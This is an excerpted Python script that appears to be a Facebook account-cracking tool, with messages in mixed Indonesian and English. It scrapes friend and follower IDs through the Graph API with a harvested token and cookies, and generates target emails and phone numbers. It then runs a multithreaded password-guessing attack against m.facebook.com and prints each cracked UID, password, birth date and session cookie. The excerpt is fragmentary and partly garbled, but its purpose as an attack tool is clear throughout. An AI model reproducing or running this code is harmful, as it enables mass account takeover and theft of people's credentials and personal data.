...
try:
	clear_layar()
	print(logo2())
	print(f'\r\n [{hh}•{P}] being dumped proxy dan create useragent')
...
except:sys.exit(f" [{M}•{P}] proxy dump failed")
...
def cek_opsi_cp():
	...
	exc = input(f' [{kk}<{P}] number which will be checked\n number : ')
	file = nom[int(exc)-1]
	print(' ')
	detek.append('file')
...
def cek_account():
	...
	exc = input(f' [{hh}<{P}] number file which will be checked\n file : ')
	xxx = input(' save the non-non-standard account to what file : \n nama : ')
	nonon = xxx+'.txt'
	file = nom[int(exc)-1]
	print(' ')
	print(f' account tidak kenon di : {nonon}\n account yang kenon di  : buang goblok')
	print(' ')
	try:
...
def cek_HASAN():
	no,nom = 0,[]
	one = input(f' [{hh}1{P}] cek HASANðŸ’š account ok\n [{hh}2{P}] cek HASANðŸ’” account cp\n menu : ')
	if one in ['1','01']:
		try:ok = os.listdir('OK')
		...
		except:sys.exit(f" [{M}•{P}] file does not exist "" ok")
		print(hh+buka+P)
	elif one in ['2','02']:
		try:ok = os.listdir('CP')
		...
		except:sys.exit(f "[{M}•{P}] file does not exist"" cp")
		print(kk+buka+P)
	else:sys.exit(f" [{M}•{P}] correct content")
...
def crack_number():
	...
	depan = input(' awalan : ')
	if len(depan)==3:pass
	else:exit(f' [{M}•{P}]  example number 089')
	jumla = input(' amount : ')
...
def clon_email():
	rc = random.choice
	rr = random.randint
	bas = ['khan','freefire','muhammad','nur','dewi','free fire','Free Fire','FreeFire','putri','FREEFIRE','sari','aditya','FREE FIRE','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','@@@','###','$$$','@#@','#@#','@1#','#1@','cakep']
	global ok , cp
	print(f' [{hh}•{P}] dump dari email, max 1000 id')
	nama = input(' target : ')
	if ',' in str(nama):
		exit(f' [{M}<{P}] input 1 name only')
	doma = input(' domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f' [{M}<{P}] input domain yours sincerely')
	amount = input(' total  : ')
	for xyz in range(int(amount)):
		A = nama
...
def crack_file():
	...
	print(f'\r [{hh}<{P}] total amount account is {len(dump)}')
	atur_atur()
...
def crack_search():
	...
	print(f' [{hh}<{P}] 1 nama setara dengan 10k account')
...
def crack_publik(t,c):
	...
	try:
		bas = ses.get(f'https://graph.facebook.com/{account}?fields=friends.fields(id,name,username)&access_token={t}',cookies=c).json()
...
def crack_masal(t,c):
    ...
    for bz in range(apa):
    	bz +=1
    	account = input(f'\r ID {bz} : ')
    	try:
    		bas = ses.get(f'https://graph.facebook.com/{account}?fields=friends.fields(name,username,id)&access_token={t}',cookies=c).json()
    		for pi in bas['friends']['data']:
    		      try:dump.append(pi['username']+'|'+pi['name'])
    		      except:dump.append(pi['id']+'|'+pi['name'])
    		      print('\r being dumped %s id'%(len(dump)),end=" ")
...
def crack_foll(t,c):
	account = input(f' [{hh}<{P}] make sure the account is public \n account : ')
	try:
		bas = ses.get(f"https://graph.facebook.com/{account}?fields=name,subscribers.fields(id,username,name).limit(1000000000)&access_token={t}",cookies=c).json()
...
def atur_atur():
	...
	print(f"{P} ")
	ch = input(f' [{hh}RANDOM{P}] [O]• OLD/ [N]• NEW/ [R]• RANDOM: ')
	if ch in ['o','O']:
		for x in dump:
			id.append(x)
	elif ch in ['n','N']:
...
def manual():
	...
	with tred(max_workers=30) as babas:
		for account in id:
			idf,nama = account.split('|')[0],account.split('|')[1].lower()
			if 'mobile' in metode:
				...
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] the crack has been completed amount OK:{ok} amount CP:{cp} ')
	...
	with tred(max_workers=30) as babas:
		for account in id:
			...
			if 'mobile' in metode:
				...
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] the crack amount OK:{ok} amount of CP:{cp} ')
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict():
				...
				if data in rescp:pass
					...
					if 'ya' in cepeh:
						...
						try:
							...
							m, d, y = ttl.split('/')
							m = tete[m]
							print(f'\r [{kk}CP{P}] UID :{kk}{idf}{P}          \n [{kk}CP{P}] PASS  : {kk}{pw}          {P}\n [{kk}•{P}] lahir  : {kk}{d} {m} {y}{P}           \n')
							sapi = f'{idf}|{pw}|{d} {m} {y}'
				...
				if data in resok:pass
					...
					if "coki" in accountok:
						print("\n %s[OK] %s | %s %sâ€¢ %s "%(H,idf,pw,warna_warni_biasa,tahunng(idf)))
						print("\r %sCookie %s "%(H,kuki))
						break
					elif "apk" in accountok:
						cek_apk(idf,pw,kuki)
						break				
			else:
				continue
...
def cek_opsi(idf,pw,ua):
	...
	try:
		...
		m, d, y = ttl.split('/')
		m = tete[m]
		account += f' [{kk}CP{P}] UID :{kk}{idf}{P}          \n [{kk}CP{P}] PASS  : {kk}{pw}          {P}\n [{kk}•{P}] lahir  : {kk}{d} {m} {y}{P}           '
...
def cek_apk(idf,pw,kuki):
	...
	if len(apk1)==0:pass
		...
		account = (f' [{hh}•{P}] application added :                     ')
		no = 0
		for apk in apk1:
			no += 1
	...
	if len(apk2)==0:pass
		...
		account = (f' {P}[{kk}•{P}] expired application :                   ')
		no = 0
		for apk in apk2:
			no += 1
